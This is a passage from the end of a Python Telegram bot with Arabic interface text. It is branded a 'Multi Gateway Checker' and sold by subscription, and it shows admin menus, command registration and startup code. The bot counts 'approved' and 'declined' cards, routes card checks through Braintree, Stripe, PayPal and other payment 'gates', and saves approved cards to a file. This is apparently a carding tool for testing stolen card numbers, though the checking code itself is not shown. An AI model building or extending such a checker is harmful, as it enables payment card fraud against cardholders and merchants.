            elif data == "admin_add_sub" and user_id in ADMIN_IDS:
                msg = bot.send_message(
                    call.message.chat.id,
                    "➕ <b>إضافة اشتراك لمستخدم</b>\n\n"
                    "أرسل معرف المستخدم والمدة بالأيام:\n"
                    "<code>ايدي المدة</code>\n\n"
                    "مثال: <code>123456789 30</code>",
                    parse_mode='HTML'
                )
                bot.register_next_step_handler(msg, self.cmd_handler.process_add_subscription)
            
            elif data == "admin_remove_sub" and user_id in ADMIN_IDS:
                msg = bot.send_message(
                    call.message.chat.id,
                    "➖ <b>إزالة اشتراك مستخدم</b>\n\n"
                    "أرسل معرف المستخدم:\n"
                    "<code>123456789</code>",
                    parse_mode='HTML'
                )
                bot.register_next_step_handler(msg, self.cmd_handler.process_remove_subscription)
            
            elif data == "admin_stats" and user_id in ADMIN_IDS:
                stats = DataManager.load_stats()
                users = DataManager.load_users()
                
                admin_stats = f"""
👑 <b>إحصائيات المشرف</b>
━━━━━━━━━━━━━━━━
👥 إجمالي المستخدمين: {len(users)}
✅ المشتركين النشطين: {sum(1 for u in users.values() if u.get('subscription', {}).get('active'))}

📊 إحصائيات البوت:
• إجمالي الفحوصات: {stats.get('total_checks', 0)}
• البطاقات المقبولة: {stats.get('total_approved', 0)}
• البطاقات المرفوضة: {stats.get('total_declined', 0)}

🚪 استخدام البوابات:
"""
                for gate, count in stats.get('gates_usage', {}).items():
                    gate_name = GATES.get(gate, {}).get('name', gate)
                    admin_stats += f"  • {gate_name}: {count}\n"
                
                bot.edit_message_text(
                    admin_stats,
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='HTML',
                    reply_markup=UserInterface.back_button("admin_menu")
                )
            
            elif data == "admin_broadcast" and user_id in ADMIN_IDS:
                msg = bot.send_message(
                    call.message.chat.id,
                    "📢 <b>إرسال إشعار لجميع المستخدمين</b>\n\n"
                    "أرسل النص الذي تريد نشره:",
                    parse_mode='HTML'
                )
                bot.register_next_step_handler(msg, self.cmd_handler.process_broadcast)
            
            elif data == "admin_settings" and user_id in ADMIN_IDS:
                settings_text = f"""
⚙️ <b>إعدادات البوت</b>
━━━━━━━━━━━━━━━━
🤖 توكن البوت: {BOT_TOKEN[:10]}...{BOT_TOKEN[-10:]}
👑 المشرفون: {', '.join(str(a) for a in ADMIN_IDS)}
📢 القناة: {CHANNEL_USERNAME}
👤 المطور: {DEV_CONTACT}

🚪 البوابات المفعلة:
"""
                for gate_id, gate_info in GATES.items():
                    status = "✅" if gate_info.get('enabled', True) else "❌"
                    settings_text += f"{status} {gate_info['name']}\n"
                
                bot.edit_message_text(
                    settings_text,
                    call.message.chat.id,
                    call.message.message_id,
                    parse_mode='HTML',
                    reply_markup=UserInterface.back_button("admin_menu")
                )
            
            else:
                bot.answer_callback_query(call.id, "⚠️ أمر غير معروف")
                
        except Exception as e:
            bot.answer_callback_query(call.id, f"⚠️ خطأ: {str(e)[:30]}")

# ==================== إعداد البوت وتشغيله ====================
def setup_bot():
    """إعداد وتشغيل البوت"""
    
    # إنشاء الملفات الضرورية
    for file in [USERS_FILE, APPROVED_CARDS_FILE, STATS_FILE]:
        if not os.path.exists(file):
            with open(file, 'w', encoding='utf-8') as f:
                if file.endswith('.json'):
                    json.dump({} if file != STATS_FILE else {
                        "total_checks": 0,
                        "total_approved": 0,
                        "total_declined": 0,
                        "gates_usage": {},
                        "daily_stats": {},
                        "last_reset": datetime.now().isoformat()
                    }, f, indent=4)
                else:
                    f.write("# Obeida Online Approved Cards\n")
    
    # إنشاء معالجات
    cmd_handler = CommandHandler()
    callback_handler = CallbackHandler(cmd_handler)
    
    # ==================== أوامر البوت ====================
    
    @bot.message_handler(commands=['start'])
    def start_command(message):
        cmd_handler.handle_start(message)
    
    @bot.message_handler(commands=['help'])
    def help_command(message):
        cmd_handler.handle_help(message)
    
    @bot.message_handler(commands=['profile'])
    def profile_command(message):
        cmd_handler.handle_profile(message)
    
    @bot.message_handler(commands=['stats'])
    def stats_command(message):
        cmd_handler.handle_stats(message)
    
    @bot.message_handler(commands=['subscribe'])
    def subscribe_command(message):
        cmd_handler.handle_subscribe(message)
    
    @bot.message_handler(commands=['gates'])
    def gates_command(message):
        cmd_handler.handle_gates(message)
    
    @bot.message_handler(commands=['mass'])
    def mass_command(message):
        cmd_handler.handle_mass_check(message)
    
    # أوامر البوابات
    @bot.message_handler(commands=['braintree'])
    def braintree_command(message):
        cmd_handler.handle_single_check(message, 'braintree')
    
    @bot.message_handler(commands=['switchup'])
    def switchup_command(message):
        cmd_handler.handle_single_check(message, 'switchup')
    
    @bot.message_handler(commands=['stripe'])
    def stripe_command(message):
        cmd_handler.handle_single_check(message, 'stripe')
    
    @bot.message_handler(commands=['zendrop'])
    def zendrop_command(message):
        cmd_handler.handle_single_check(message, 'zendrop')
    
    @bot.message_handler(commands=['paypal'])
    def paypal_command(message):
        cmd_handler.handle_single_check(message, 'paypal')
    
    # أوامر المشرفين
    @bot.message_handler(commands=['admin'])
    def admin_command(message):
        if message.from_user.id in ADMIN_IDS:
            bot.reply_to(
                message,
                "👑 <b>قائمة المشرفين</b>",
                parse_mode='HTML',
                reply_markup=UserInterface.admin_menu()
            )
        else:
            bot.reply_to(message, "⛔ <b>هذا الأمر مخصص للمشرفين فقط</b>", parse_mode='HTML')
    
    # ==================== معالجات الوسائط ====================
    
    @bot.message_handler(content_types=['document'])
    def handle_document(message):
        cmd_handler.handle_document(message)
    
    @bot.message_handler(func=lambda message: True)
    def handle_text(message):
        cmd_handler.handle_text(message)
    
    # ==================== معالج الكول باك ====================
    
    @bot.callback_query_handler(func=lambda call: True)
    def callback_query(call):
        callback_handler.handle_callback(call)
    
    # ==================== معلومات البوت ====================
    
    bot_info = f"""
╔══════════════════════════╗
║     Obeida Online Bot    ║
║    Multi Gateway Checker  ║
╠══════════════════════════╣
║ مشرفون: {len(ADMIN_IDS)}
║ بوابات: {len(GATES)}
║ قناة: {CHANNEL_USERNAME}
║ مطور: {DEV_CONTACT}
╚══════════════════════════╝
    """
    
    print(Fore.CYAN + "="*50)
    print(Fore.GREEN + bot_info)
    print(Fore.CYAN + "="*50)
    print(Fore.YELLOW + "🚀 البوت يعمل الآن...")
    print(Fore.YELLOW + "📢 القناة: " + Fore.WHITE + CHANNEL_USERNAME)
    print(Fore.YELLOW + "👤 المطور: " + Fore.WHITE + DEV_CONTACT)
    print(Fore.CYAN + "="*50 + Style.RESET_ALL)
    
    # تشغيل البوت
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(Fore.RED + f"❌ خطأ في تشغيل البوت: {e}" + Style.RESET_ALL)
        time.sleep(5)
        # إعادة التشغيل التلقائي
        setup_bot()

# ==================== نقطة البداية ====================
if __name__ == "__main__":
    try:
        setup_bot()
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n⚠️ تم إيقاف البوت بواسطة المستخدم" + Style.RESET_ALL)
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\n❌ خطأ غير متوقع: {e}" + Style.RESET_ALL)
        sys.exit(1)
